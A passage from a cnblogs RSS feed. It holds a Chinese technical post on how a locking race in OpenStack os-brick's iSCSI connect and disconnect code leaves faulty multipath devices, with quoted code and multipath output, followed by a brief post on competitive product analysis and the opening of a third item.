&lt;h3&gt;什么是faulty device&lt;/h3&gt;
&lt;p&gt;当host上multipath软件发现对应的host path不可访问时，就会显示为faulty状态。&lt;/p&gt;
&lt;p&gt;关于所有状态的描述，可以参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/Linux_DM_Multipath&quot; target=&quot;_blank&quot;&gt;https://en.wikipedia.org/wiki/Linux_DM_Multipath&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;os-brick的代码我选择的是比较早期容易产生faulty device的版本：&lt;span&gt;https://github.com/openstack/os-brick/blob/liberty-eol/os_brick/initiator/connector.py&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;connect_volume的主要逻辑如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;59&quot;&gt;
&lt;pre&gt;
&lt;span&gt;  1&lt;/span&gt;     @synchronized(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;connect_volume&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;  2&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; connect_volume(self, connection_properties):
&lt;/span&gt;&lt;span&gt;  3&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;Attach the volume to instance_name.
&lt;/span&gt;&lt;span&gt;  4&lt;/span&gt; &lt;span&gt;        connection_properties for iSCSI must include:
&lt;/span&gt;&lt;span&gt;  5&lt;/span&gt; &lt;span&gt;        target_portal(s) - ip and optional port
&lt;/span&gt;&lt;span&gt;  6&lt;/span&gt; &lt;span&gt;        target_iqn(s) - iSCSI Qualified Name
&lt;/span&gt;&lt;span&gt;  7&lt;/span&gt; &lt;span&gt;        target_lun(s) - LUN id of the volume
&lt;/span&gt;&lt;span&gt;  8&lt;/span&gt; &lt;span&gt;        Note that plural keys may be used when use_multipath=True
&lt;/span&gt;&lt;span&gt;  9&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt; 10&lt;/span&gt; 
&lt;span&gt; 11&lt;/span&gt;         device_info = {&lt;span&gt;'&lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;block&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;}
&lt;/span&gt;&lt;span&gt; 12&lt;/span&gt; 
&lt;span&gt; 13&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt;&lt;span&gt; self.use_multipath:
&lt;/span&gt;&lt;span&gt; 14&lt;/span&gt;             &lt;span&gt;#&lt;/span&gt;&lt;span&gt; Multipath installed, discovering other targets if available&lt;/span&gt;
&lt;span&gt; 15&lt;/span&gt;             &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt; 16&lt;/span&gt;                 ips_iqns =&lt;span&gt; self._discover_iscsi_portals(connection_properties)
&lt;/span&gt;&lt;span&gt; 17&lt;/span&gt;             &lt;span&gt;except&lt;/span&gt;&lt;span&gt; Exception:
&lt;/span&gt;&lt;span&gt; 18&lt;/span&gt;                 &lt;span&gt;raise&lt;/span&gt;&lt;span&gt; exception.TargetPortalNotFound(
&lt;/span&gt;&lt;span&gt; 19&lt;/span&gt;                     target_portal=connection_properties[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;target_portal&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;])
&lt;/span&gt;&lt;span&gt; 20&lt;/span&gt; 
&lt;span&gt; 21&lt;/span&gt;             &lt;span&gt;if&lt;/span&gt; &lt;span&gt;not&lt;/span&gt; connection_properties.get(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;target_iqns&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;):
&lt;/span&gt;&lt;span&gt; 22&lt;/span&gt;                 &lt;span&gt;#&lt;/span&gt;&lt;span&gt; There are two types of iSCSI multipath devices. One which&lt;/span&gt;
&lt;span&gt; 23&lt;/span&gt;                 &lt;span&gt;#&lt;/span&gt;&lt;span&gt; shares the same iqn between multiple portals, and the other&lt;/span&gt;
&lt;span&gt; 24&lt;/span&gt;                 &lt;span&gt;#&lt;/span&gt;&lt;span&gt; which use different iqns on different portals.&lt;/span&gt;
&lt;span&gt; 25&lt;/span&gt;                 &lt;span&gt;#&lt;/span&gt;&lt;span&gt; Try to identify the type by checking the iscsiadm output&lt;/span&gt;
&lt;span&gt; 26&lt;/span&gt;                 &lt;span&gt;#&lt;/span&gt;&lt;span&gt; if the iqn is used by multiple portals. If it is, it's&lt;/span&gt;
&lt;span&gt; 27&lt;/span&gt;                 &lt;span&gt;#&lt;/span&gt;&lt;span&gt; the former, so use the supplied iqn. Otherwise, it's the&lt;/span&gt;
&lt;span&gt; 28&lt;/span&gt;                 &lt;span&gt;#&lt;/span&gt;&lt;span&gt; latter, so try the ip,iqn combinations to find the targets&lt;/span&gt;
&lt;span&gt; 29&lt;/span&gt;                 &lt;span&gt;#&lt;/span&gt;&lt;span&gt; which constitutes the multipath device.&lt;/span&gt;
&lt;span&gt; 30&lt;/span&gt;                 main_iqn = connection_properties[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;target_iqn&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]
&lt;/span&gt;&lt;span&gt; 31&lt;/span&gt;                 all_portals = set([ip &lt;span&gt;for&lt;/span&gt; ip, iqn &lt;span&gt;in&lt;/span&gt;&lt;span&gt; ips_iqns])
&lt;/span&gt;&lt;span&gt; 32&lt;/span&gt;                 match_portals = set([ip &lt;span&gt;for&lt;/span&gt; ip, iqn &lt;span&gt;in&lt;/span&gt;&lt;span&gt; ips_iqns
&lt;/span&gt;&lt;span&gt; 33&lt;/span&gt;                                      &lt;span&gt;if&lt;/span&gt; iqn ==&lt;span&gt; main_iqn])
&lt;/span&gt;&lt;span&gt; 34&lt;/span&gt;                 &lt;span&gt;if&lt;/span&gt; len(all_portals) ==&lt;span&gt; len(match_portals):
&lt;/span&gt;&lt;span&gt; 35&lt;/span&gt;                     ips_iqns = zip(all_portals, [main_iqn] *&lt;span&gt; len(all_portals))
&lt;/span&gt;&lt;span&gt; 36&lt;/span&gt; 
&lt;span&gt; 37&lt;/span&gt;             &lt;span&gt;for&lt;/span&gt; ip, iqn &lt;span&gt;in&lt;/span&gt;&lt;span&gt; ips_iqns:
&lt;/span&gt;&lt;span&gt; 38&lt;/span&gt;                 props =&lt;span&gt; copy.deepcopy(connection_properties)
&lt;/span&gt;&lt;span&gt; 39&lt;/span&gt;                 props[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;target_portal&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] =&lt;span&gt; ip
&lt;/span&gt;&lt;span&gt; 40&lt;/span&gt;                 props[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;target_iqn&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] =&lt;span&gt; iqn
&lt;/span&gt;&lt;span&gt; 41&lt;/span&gt; &lt;span&gt;                self._connect_to_iscsi_portal(props)
&lt;/span&gt;&lt;span&gt; 42&lt;/span&gt; 
&lt;span&gt; 43&lt;/span&gt; &lt;span&gt;            self._rescan_iscsi()
&lt;/span&gt;&lt;span&gt; 44&lt;/span&gt;             host_devices =&lt;span&gt; self._get_device_path(connection_properties)
&lt;/span&gt;&lt;span&gt; 45&lt;/span&gt;         &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt; 46&lt;/span&gt;             target_props =&lt;span&gt; connection_properties
&lt;/span&gt;&lt;span&gt; 47&lt;/span&gt;             &lt;span&gt;for&lt;/span&gt; props &lt;span&gt;in&lt;/span&gt;&lt;span&gt; self._iterate_all_targets(connection_properties):
&lt;/span&gt;&lt;span&gt; 48&lt;/span&gt;                 &lt;span&gt;if&lt;/span&gt;&lt;span&gt; self._connect_to_iscsi_portal(props):
&lt;/span&gt;&lt;span&gt; 49&lt;/span&gt;                     target_props =&lt;span&gt; props
&lt;/span&gt;&lt;span&gt; 50&lt;/span&gt;                     &lt;span&gt;break&lt;/span&gt;
&lt;span&gt; 51&lt;/span&gt;                 &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt; 52&lt;/span&gt; &lt;span&gt;                    LOG.warning(_LW(
&lt;/span&gt;&lt;span&gt; 53&lt;/span&gt;                         &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Failed to connect to iSCSI portal %(portal)s.&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;),
&lt;/span&gt;&lt;span&gt; 54&lt;/span&gt;                         {&lt;span&gt;'&lt;/span&gt;&lt;span&gt;portal&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: props[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;target_portal&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]})
&lt;/span&gt;&lt;span&gt; 55&lt;/span&gt; 
&lt;span&gt; 56&lt;/span&gt;             host_devices =&lt;span&gt; self._get_device_path(target_props)
&lt;/span&gt;&lt;span&gt; 57&lt;/span&gt; 
&lt;span&gt; 58&lt;/span&gt;         &lt;span&gt;#&lt;/span&gt;&lt;span&gt; The /dev/disk/by-path/... node is not always present immediately&lt;/span&gt;
&lt;span&gt; 59&lt;/span&gt;         &lt;span&gt;#&lt;/span&gt;&lt;span&gt; TODO(justinsb): This retry-with-delay is a pattern, move to utils?&lt;/span&gt;
&lt;span&gt; 60&lt;/span&gt;         tries =&lt;span&gt; 0
&lt;/span&gt;&lt;span&gt; 61&lt;/span&gt;         &lt;span&gt;#&lt;/span&gt;&lt;span&gt; Loop until at least 1 path becomes available&lt;/span&gt;
&lt;span&gt; 62&lt;/span&gt;         &lt;span&gt;while&lt;/span&gt; all(map(&lt;span&gt;lambda&lt;/span&gt; x: &lt;span&gt;not&lt;/span&gt;&lt;span&gt; os.path.exists(x), host_devices)):
&lt;/span&gt;&lt;span&gt; 63&lt;/span&gt;             &lt;span&gt;if&lt;/span&gt; tries &amp;gt;=&lt;span&gt; self.device_scan_attempts:
&lt;/span&gt;&lt;span&gt; 64&lt;/span&gt;                 &lt;span&gt;raise&lt;/span&gt; exception.VolumeDeviceNotFound(device=&lt;span&gt;host_devices)
&lt;/span&gt;&lt;span&gt; 65&lt;/span&gt; 
&lt;span&gt; 66&lt;/span&gt;             LOG.warning(_LW(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ISCSI volume not yet found at: %(host_devices)s. &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 67&lt;/span&gt;                             &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Will rescan &amp;amp; retry.  Try number: %(tries)s.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;),
&lt;/span&gt;&lt;span&gt; 68&lt;/span&gt;                         {&lt;span&gt;'&lt;/span&gt;&lt;span&gt;host_devices&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: host_devices,
&lt;/span&gt;&lt;span&gt; 69&lt;/span&gt;                          &lt;span&gt;'&lt;/span&gt;&lt;span&gt;tries&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: tries})
&lt;/span&gt;&lt;span&gt; 70&lt;/span&gt; 
&lt;span&gt; 71&lt;/span&gt;             &lt;span&gt;#&lt;/span&gt;&lt;span&gt; The rescan isn't documented as being necessary(?), but it helps&lt;/span&gt;
&lt;span&gt; 72             if self.use_multipath:
 73                 self._rescan_iscsi()
&lt;/span&gt;&lt;span&gt; 74&lt;/span&gt;             &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt; 75&lt;/span&gt;                 &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (tries):
&lt;/span&gt;&lt;span&gt; 76&lt;/span&gt;                     host_devices =&lt;span&gt; self._get_device_path(target_props)
&lt;/span&gt;&lt;span&gt; 77&lt;/span&gt;                 self._run_iscsiadm(target_props, (&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;--rescan&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,))
&lt;/span&gt;&lt;span&gt; 78&lt;/span&gt; 
&lt;span&gt; 79&lt;/span&gt;             tries = tries + 1
&lt;span&gt; 80&lt;/span&gt;             &lt;span&gt;if&lt;/span&gt; all(map(&lt;span&gt;lambda&lt;/span&gt; x: &lt;span&gt;not&lt;/span&gt;&lt;span&gt; os.path.exists(x), host_devices)):
&lt;/span&gt;&lt;span&gt; 81&lt;/span&gt;                 time.sleep(tries ** 2&lt;span&gt;)
&lt;/span&gt;&lt;span&gt; 82&lt;/span&gt;             &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt; 83&lt;/span&gt;                 &lt;span&gt;break&lt;/span&gt;
&lt;span&gt; 84&lt;/span&gt; 
&lt;span&gt; 85&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; tries !=&lt;span&gt; 0:
&lt;/span&gt;&lt;span&gt; 86&lt;/span&gt;             LOG.debug(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Found iSCSI node %(host_devices)s &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 87&lt;/span&gt;                       &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;(after %(tries)s rescans)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
&lt;/span&gt;&lt;span&gt; 88&lt;/span&gt;                       {&lt;span&gt;'&lt;/span&gt;&lt;span&gt;host_devices&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: host_devices, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;tries&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: tries})
&lt;/span&gt;&lt;span&gt; 89&lt;/span&gt; 
&lt;span&gt; 90&lt;/span&gt;         &lt;span&gt;#&lt;/span&gt;&lt;span&gt; Choose an accessible host device&lt;/span&gt;
&lt;span&gt; 91&lt;/span&gt;         host_device = next(dev &lt;span&gt;for&lt;/span&gt; dev &lt;span&gt;in&lt;/span&gt; host_devices &lt;span&gt;if&lt;/span&gt;&lt;span&gt; os.path.exists(dev))
&lt;/span&gt;&lt;span&gt; 92&lt;/span&gt; 
&lt;span&gt; 93         if self.use_multipath:
 94             # We use the multipath device instead of the single path device
 95             self._rescan_multipath()
&lt;/span&gt;&lt;span&gt; 96&lt;/span&gt;             multipath_device =&lt;span&gt; self._get_multipath_device_name(host_device)
&lt;/span&gt;&lt;span&gt; 97&lt;/span&gt;             &lt;span&gt;if&lt;/span&gt; multipath_device &lt;span&gt;is&lt;/span&gt; &lt;span&gt;not&lt;/span&gt;&lt;span&gt; None:
&lt;/span&gt;&lt;span&gt; 98&lt;/span&gt;                 host_device =&lt;span&gt; multipath_device
&lt;/span&gt;&lt;span&gt; 99&lt;/span&gt;                 LOG.debug(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Unable to find multipath device name for &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;100&lt;/span&gt;                           &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;volume. Only using path %(device)s &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;101&lt;/span&gt;                           &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;for volume.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, {&lt;span&gt;'&lt;/span&gt;&lt;span&gt;device&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: host_device})
&lt;/span&gt;&lt;span&gt;102&lt;/span&gt; 
&lt;span&gt;103&lt;/span&gt;         device_info[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;path&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] =&lt;span&gt; host_device
&lt;/span&gt;&lt;span&gt;104&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt; device_info
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中重要的逻辑我都用&lt;span&gt;红色&lt;/span&gt;标记了，用来发现host上的块设备device&lt;/p&gt;
&lt;p&gt;disconnect_volume逻辑如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt;     @synchronized(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;connect_volume&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; disconnect_volume(self, connection_properties, device_info):
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;Detach the volume from instance_name.
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;        connection_properties for iSCSI must include:
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;        target_portal(s) - IP and optional port
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;        target_iqn(s) - iSCSI Qualified Name
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;        target_lun(s) - LUN id of the volume
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt; 9&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt;&lt;span&gt; self.use_multipath:
&lt;/span&gt;&lt;span&gt;10             self._rescan_multipath()
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;             host_device = multipath_device =&lt;span&gt; None
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;             host_devices =&lt;span&gt; self._get_device_path(connection_properties)
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;             &lt;span&gt;#&lt;/span&gt;&lt;span&gt; Choose an accessible host device&lt;/span&gt;
&lt;span&gt;14&lt;/span&gt;             &lt;span&gt;for&lt;/span&gt; dev &lt;span&gt;in&lt;/span&gt;&lt;span&gt; host_devices:
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;                 &lt;span&gt;if&lt;/span&gt;&lt;span&gt; os.path.exists(dev):
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;                     host_device =&lt;span&gt; dev
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt;                     multipath_device =&lt;span&gt; self._get_multipath_device_name(dev)
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;                     &lt;span&gt;if&lt;/span&gt;&lt;span&gt; multipath_device:
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt;                         &lt;span&gt;break&lt;/span&gt;
&lt;span&gt;20&lt;/span&gt;             &lt;span&gt;if&lt;/span&gt; &lt;span&gt;not&lt;/span&gt;&lt;span&gt; host_device:
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt;                 LOG.error(_LE(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;No accessible volume device: %(host_devices)s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;),
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;                           {&lt;span&gt;'&lt;/span&gt;&lt;span&gt;host_devices&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: host_devices})
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;                 &lt;span&gt;raise&lt;/span&gt; exception.VolumeDeviceNotFound(device=&lt;span&gt;host_devices)
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt; 
&lt;span&gt;25&lt;/span&gt;             &lt;span&gt;if&lt;/span&gt;&lt;span&gt; multipath_device:
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt;                 device_realpath =&lt;span&gt; os.path.realpath(host_device)
&lt;/span&gt;&lt;span&gt;27                 self._linuxscsi.remove_multipath_device(device_realpath)
28                 return self._disconnect_volume_multipath_iscsi(
29                     connection_properties, multipath_device)
&lt;/span&gt;&lt;span&gt;30&lt;/span&gt; 
&lt;span&gt;31&lt;/span&gt;         &lt;span&gt;#&lt;/span&gt;&lt;span&gt; When multiple portals/iqns/luns are specified, we need to remove&lt;/span&gt;
&lt;span&gt;32&lt;/span&gt;         &lt;span&gt;#&lt;/span&gt;&lt;span&gt; unused devices created by logging into other LUNs' session.&lt;/span&gt;
&lt;span&gt;33&lt;/span&gt;         &lt;span&gt;for&lt;/span&gt; props &lt;span&gt;in&lt;/span&gt;&lt;span&gt; self._iterate_all_targets(connection_properties):
&lt;/span&gt;&lt;span&gt;34&lt;/span&gt;             self._disconnect_volume_iscsi(props)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上面的&lt;span&gt;红色&lt;/span&gt;代码块，会把LUN对应的host path从kernel中，和multipath mapper中删除。&lt;/p&gt;

&lt;p&gt;注意到，以上两个接口都是用的同一个叫（connect_volume)的锁（其实就是用flock实现的Linux上的文件锁）&lt;/p&gt;
&lt;p&gt;为了方便描述faulty device的产生，我画了如下的图，来表示两个接口的关系&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/157769/201804/157769-20180415210316955-2112585159.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如上的流程在非并发的情况下是表现正常的，host上的device都可以正常连接和清理。&lt;/p&gt;

&lt;p&gt;但是，以上逻辑有个实现上的问题，当高并发情况下，会产生faulty device， 考虑一下执行顺序：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;右边的&lt;em&gt;disconnect_volume&lt;/em&gt;执行完毕，存储上LUN对应的device path(在/dev/disk/by-path下可以看到）和multipath descriptor（multipath -l可以看到）。&lt;/li&gt;
&lt;li&gt;这个时候，&lt;em&gt;connect_volume&lt;/em&gt;锁被释放，左边的&lt;em&gt;connect_volume&lt;/em&gt;开始执行，而右边的&lt;em&gt;terminate_connection&lt;/em&gt;还没有执行，也就是说，&lt;span&gt;存储上还没有移除host访问LUN的权限，任何host上的scsi rescan还是会发现这个LUN的device&lt;/span&gt;。&lt;/li&gt;
&lt;li&gt;接着，&lt;em&gt;connect_volume&lt;/em&gt;按正常执行，iscsi rescan 和multipath rescan都相继执行，造成在步骤 1）中已经删除的device有重新被scan出来。&lt;/li&gt;
&lt;li&gt;然后，右边的terminate_connection在存储上执行完成，移除了host对LUN的访问，&lt;span&gt;&lt;span&gt;最终就形成的所谓的faulty device，&lt;span&gt;看到的multipath 输出如下(两个multipath descriptor都是faulty的）：&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
$ sudo multipath -&lt;span&gt;ll

3600601601290380036a00936cf13e711 dm&lt;/span&gt;-30&lt;span&gt; DGC,VRAID
size&lt;/span&gt;=2.0G features=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;1 retain_attached_hw_handler&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; hwhandler=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;1 alua&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; wp=&lt;span&gt;rw
&lt;/span&gt;|-+- policy=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;round-robin 0&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; prio=0 status=&lt;span&gt;active
&lt;/span&gt;| `- 11:0:0:151 sdef 128:112&lt;span&gt; failed faulty running
`&lt;/span&gt;-+- policy=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;round-robin 0&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; prio=0 status=&lt;span&gt;enabled
  `&lt;/span&gt;- 12:0:0:151 sdeg 128:128&lt;span&gt; failed faulty running

3600601601bd032007c097518e96ae411 dm&lt;/span&gt;-2&lt;span&gt; DGC,VRAID
size&lt;/span&gt;=1.0G features=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;1 queue_if_no_path&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; hwhandler=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;1 alua&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; wp=&lt;span&gt;rw
&lt;/span&gt;|-+- policy=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;round-robin 0&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; prio=0 status=&lt;span&gt;active
  `&lt;/span&gt;- &lt;span&gt;#&lt;/span&gt;&lt;span&gt;:#:#:# -   #:#   active faulty running&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;



&lt;p&gt;一般来说，有#:#:#:#输出的multipath是可以直接用 &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;sudo&lt;/span&gt; multipath -f 3600601601bd032007c097518e96ae411 &lt;/span&gt; 删除的。&lt;/p&gt;
&lt;p&gt;作为第一部分，到这里faulty device的产生介绍完了，后面在找机会，介绍下在os-brick中如何尽量避免faulty device的出现。&lt;/p&gt;

&lt;p&gt;参考资料：&lt;/p&gt;
&lt;p&gt;RedHat官方multipath的介绍：https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/dm_multipath/mpio_description&lt;/p&gt;
&lt;p&gt;EMC VNX driver doc：https://docs.openstack.org/cinder/queens/configuration/block-storage/drivers/dell-emc-vnx-driver.html&lt;/p&gt;
&lt;p&gt;Go实现的块设备连接工具：https://github.com/peter-wangxu/goock&lt;/p&gt;
&lt;p&gt;iSCSI Faulty Device Cleanup Script for VNX：https://github.com/emc-openstack/vnx-faulty-device-cleanup&lt;/p&gt;

</description>
<pubDate>Sun, 15 Apr 2018 13:54:00 +0000</pubDate>
<dc:creator>孤独的居士</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/sting2me/p/8849689.html</dc:identifier>
</item>
<item>
<title>竞品分析--近来感悟 - 工藤-新一</title>
<link>http://www.cnblogs.com/gt-xy/p/8849312.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/gt-xy/p/8849312.html</guid>
<description>&lt;p&gt;　　&lt;span&gt;博主目前在一家做工控产品的公司研发，很多时候我们在做一个项目时市场只会提出需要研发XXX项目，没有需求，他们也无法做到需求的分析，所以竞品分析在我们公司算是重要的环节之一，竞品分析如果跑偏很容易会导致实现出来的产品无法满足客户的要求，因为公司规模比较小，竞品分析只能由研发自己实现。但是，尽管竞品分析如此重要，公司的一些研发人员在做竞品分析时只做到了将竞品所具有的功能列出对比，这样出来的竞品分析文档仅仅是将所有竞品的说明书整成一份文档，我们不知道竞品为什么要做这个功能，这个功能对应了哪些用户需求。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　所以，这次在自己负责的项目上花了一些时间在竞品分析上，算是有一点感悟，记录于此。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;　　很多公司在做产品时提倡以用户为中心的产品设计，Jesse James Garrett的《用户体验要素》中提出的从五个层面去讨论用户体验的问题，以及用什么工具来解决用户的体验。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1266147/201804/1266147-20180415204732838-1787969340.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　产品设计时自底向上，从战略层到用户可直接感官认知的表现层，每个相邻层次相互影响。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1266147/201804/1266147-20180415210835252-457896770.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　从用户体验要素的五个层面可以帮助我们更好的了解整个问题。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;　　跟据特定场景找到适合的竞品分析方法，目前我们在做竞品分析时，战略层上产品目标是明确的但用户需求不知道，我们的竞品在很久以前就已经在市场上经过一轮有一轮的验证过并且能够认为其比较稳定，竞品的用户需求是明确的，这样通过竞品具有的功能来推测用户需求。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　在我们的战略层确认之后，我们可以在相同的需求上实现不同于竞品的功能，并且能够为功能的优先级排序，在此之上我们确认好结构层、框架层、表现层，对我们公司来说竞品分析的重点在于战略层的确认以及功能的优先级排序，因为是工控产品对于使用上要求会松一点。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;　　这次的项目还在进行当中，不知道我所做的决定是否正确，但我认为竞品分析对于我们公司来说确实很重要，对于竞品分析，我们还在路上...&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 15 Apr 2018 13:25:00 +0000</pubDate>
<dc:creator>工藤-新一</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/gt-xy/p/8849312.html</dc:identifier>
</item>
<item>
<title>一次失败的Release - HarlanC</title>
<link>http://www.cnblogs.com/harlanc/p/8849323.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/harlanc/p/8849323.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;http://oq8nryefp.bkt.clouddn.com/win7_20180415203936.png&quot;/&gt;&lt;/p&gt;
